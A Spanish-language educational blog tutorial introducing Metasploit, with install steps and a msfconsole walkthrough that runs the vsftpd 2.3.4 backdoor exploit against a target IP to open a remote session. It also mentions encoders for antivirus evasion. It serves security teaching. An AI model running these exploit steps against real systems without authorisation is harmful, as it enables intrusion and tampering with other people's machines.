---
title: "Tutorial: Metasploit"
date: 2023-01-01 9:00:00 +0100
categories: [Sistemas Microinformáticos y Redes, Seguridad Informática]
tags: [seguridad informática, smr, teoría, seguridad activa]
img_path: /assets/img/tutorial-metasploit/
---

## ¿Qué es Metasploit?

Metasploit es una herramienta software muy relacionada con lo que se conoce como "pruebas de intrusión" o "Pentesting". Como ya se ha estudiado previamente, estas pruebas se realizan en auditorías de sistemas informáticos en red, para saber cómo alguien con malas intenciones podría manipular nuestra red o nuestros sistemas en red. Mediante el uso de herramientas de pruebas de penetración, los profesionales de la seguridad informática pueden, en cualquier etapa de desarrollo o implementación, examinar redes y aplicaciones en busca de fallos y vulnerabilidades que comprometan al sistema.

Una de esas herramientas de Pentesting más conocidas es el proyecto Metasploit. Metasploit es un software de código abierto, construido en Ruby, y actualmente propiedad de la empresa de software de seguridad Rapid7. La herramienta está enfocada a la realización de pruebas para  auditores de seguridad y equipos Red Team y Blue Team (entre los profesionales de la seguridad informática, el Red Team es elequipo ofensivo o encargado del hacking ético, que hace pruebas de intrusión, y el BlueTeam es el equipo que lleva a cabo la securización y toda la parte defensiva).

<iframe width="560" height="315" src="https://www.youtube.com/embed/-B7UBbhewuw" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

## Características principales de Metasploit

Es una herramienta muy completa que tiene muchísimos "exploits", es decir, software para atacar a vulnerabilidades conocidas de otro software. En estos exploits, se pueden cargar otros módulos, llamados payloads, que son los códigos que permiten explotar dichas vulnerabilidades de distintas formas.

Dispone de distintos tipo de módulos, por ejemplo, los encoders, que son una especie de códigos de cifrado para evasión de antivirus o sistemas de seguridad perimetral.
Otra de las ventajas de este framework es que nos permite interactuar con herramientas externas, como Nmap o Nessus, útiles para descubrir información sobre los sistemas a los que se desee "atacar" o "auditar".

Aunque nosotros usaremos Metasploit desde KaliLinux (en Kali Linux ya viene instalado Metasploit Pro) se trata de un software multiplataforma y gratuito (aunque tiene una versión de pago, en la que se ofrecen exploits ya desarrollados). De todas formas, la versión gratuita es bastante amplia, y muy interesante porque contiene todas las vulnerabilidades públicas.
En conclusión, se trata de una plataforma imprescindible para todos los analistas de seguridad, esencial para descubrir vulnerabilidades ocultas utilizando diversas herramientas y utilidades. Esta herramienta  permite ponernos en la piel de un pirata informático y utilizar las mismas técnicas para explorar e infiltrarse en redes y servidores.

![Diagrama de una arquitectura típica de Metasploit](metasploit-guide-set-up.png)
_Diagrama de una arquitectura típica de Metasploit_

## Instalar Metasploit

```console
#apt install metasploit-framework
```

## Primeros pasos con Metasploit

Los pasos que debemos realizar para hacer una explotación de una vulnerabilidad de una aplicación en una máquina son los pasos típicos de un “pentesting” o test de intrusión.

### Detección de vulnerabilidades

En esta fase, se realizará un escáner de puertos, utilizando la herramienta ya conocida nmap, con la que buscaremos servicios instalados en esta máquina, así como las versiones de estos servicios. Leer el artículo [Tutorial: Nmap](/posts/tutorial-nmap).

Otra opción, es utilizar nmap solo para la detección de equipos de una red y posteriormente hacer el análisis de vulnerabilidades con Nessus. Leer el artículo [Tutorial: Nessus](/posts/tutorial-nessus)

### Explotación de vulnerabilidad conocida

Iniciamos metasploit desde linea de comandos con el comando:

```console
$msfconsole
```

Buscamos en Metasploit si tiene algún EXPLOIT para esta aplicación de servidor FTP. Esto se hace con el comando `search`.

```console
>search vsftpd
```

Vemos que Metasploit tiene disponible un Exploit para esta aplicación. Una vez que nos despliegue el índice de exploits disponibles para la aplicación vsftpd, podemos usar el numero de índice del Exploit y el comando info, para obtener información detallada de este Exploit.

```console
>info 0
```

Ahora tenemos que entrar dentro del exploit, es decir, decirle a la aplicación Metasploit que vamos a utilizar dicho Exploit. Para ello, se usa el comando:

```console
>use <nombre completo del exploit>
```

Ejemplo de uso:

```console
>use exploit/unix/ftp/vsftpd_234_backdoor
```

Una vez dentro de cada exploit disponible, cada uno tiene una serie de opciones que podemos utilizar.

```console
>show options
```

Establecemos el host:

```console
>set RHOSTS <dirección IP objetivo>
```

Ejecutamos el exploit:

```console
>exploit
```

Si la ejecución del exploit tiene éxito nos indicará que hay una sesión abierta en la máquina atacada, es decir, hemos conseguido establecer una sesión remota desde el equipo Kali Linux a la máquina vulnerable, y estamos dentro de ella. A partir de aquí ya, podemos realizar cualquier modificación en los archivos del sistema o aplicaciones instaladas en dicha máquina con fines maliciosos.
